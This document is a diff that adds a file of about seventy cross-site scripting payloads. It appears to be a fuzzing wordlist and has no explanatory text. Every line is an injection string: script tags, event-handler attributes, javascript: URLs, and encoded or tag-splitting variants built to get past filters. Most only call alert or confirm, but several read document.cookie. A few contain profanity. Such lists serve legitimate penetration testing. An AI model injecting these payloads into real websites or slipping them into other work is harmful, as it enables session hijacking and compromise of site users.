@@ -1,0 +1,70 @@
+"><script>alert('fuck')</script>
+'><script>alert('fuck')</script>
+<img src=x onerror=alert(1337)>
+<svg onload=alert(1337)>
+<iframe src="javascript:alert(1337)"></iframe>
+"><img src=x onerror=alert(1337)>
+'><svg/onload=alert('ICF')>
+<input autofocus onfocus=alert(1)>
+<body onload=alert('XSS')>
+<div onclick=alert('fuck')>Click Me</div>
+<a href="javascript:alert(1)">Click</a>
+<script>alert(&#x31);</script>
+<img src=x onerror=alert(&#49)>
+"><svg/onload=alert('fuck')>
+'><img/src=x onerror=alert('ICF')>
+<scr<script>ipt>alert(1)</scr<script>ipt>
+<svg/onload=/*comment*/alert(1)>
+javascript:alert(1)
+"><script>prompt(1)</script>
+'"><img src=x onerror=confirm(1337)>
+"><svg/onload=alert('icf')//  
+"><img/src/onerror=alert(1)//  
+<svg/onload=alert(1)>
+<math><mi/onmouseover=alert(1)></math>
+<script>alert(&#x31);</script>
+<img src=x onerror=alert(&#49)>
+<scr<script>ipt>alert('icf')</scr<script>ipt>
+<svg/onload=/*comment*/alert(1)>
+<iframe srcdoc="<script>alert(1)</script>"></iframe>
+"><svg/onload=alert('0x')//  
+"><img/src/onerror=alert(1)//
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022confirm(fuck)\u0022\u003e
+<img src=x onerror="confirm('xss')">
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022alert(1)\u0022\u003e
+\u003csvg\u0020onload\u003d\u0022alert(1)\u0022\u003e
+\u003cimg\u0020src\u003dx\u0020onerror\u003d\u0022alert('ICF')\u0022\u003e
+\u003cscript\u003ealert(1)\u003c\/script\u003e
+&#x3C;img src=x onerror=alert(1)&#x3E;
+&#60;svg onload=alert(1)&#62;
+&#x3c;svg/onload=alert(1)//
+&#x3C;img/src=x onerror=confirm(1)&#x3E;
+'><script>alert(0)</script>
+<style>@im\port'\ja\vasc\ript:alert(\"XSS\")';</style>
+<STYLE type='text/css'>BODY{background:url('javascript:alert('XSS')')}</STYLE>
+<img src=javascript:alert('fuck')>
+<marquee><script>alert('fuck')</script></marquee>
+</textarea>''><script>alert(document.cookie)</script>
+<img src=foo.png onerror=alert(/xss/) />
+<font style='color:expression(alert(document.cookie))'>
+" autofocus onfocus=alert(1) x="
+' autofocus onfocus=alert(1) x='
+" style=background:url(javascript:alert(1))
+' onmouseover=confirm(1) x='
+" /><svg/onload=alert(1)//
+" /><img src=x onerror=alert(1)//
+"></style><script>alert(1)</script>
+\u003Csvg onload=window\u003E
+"><svg><script><![CDATA[alert(1)]]></script></svg>
+"><svg/onload=/*--><![CDATA[*/alert(1)/*]]>
+<img src=x onerror=confirm('icf')>
+<img src=x onerror=window>
+<img src=x onerror=(new Function('alert(1)'))()>
+<scr/**/ipt>alert(1)</scr/**/ipt>
+<scr%00ipt>alert(1337)</scr%00ipt>
+<scr\nipt>alert(1)</scr\nipt>
+<img src=x onerror=alert/**/('icf')>
+<a href=javascript:alert(1)>click</a>
+<a href="jav&#x61;script:alert(document.cookie)">X</a>
+<a href="jav%0ascript:alert(1)">X</a>
+<iframe src="javascript:alert(1)"></iframe>
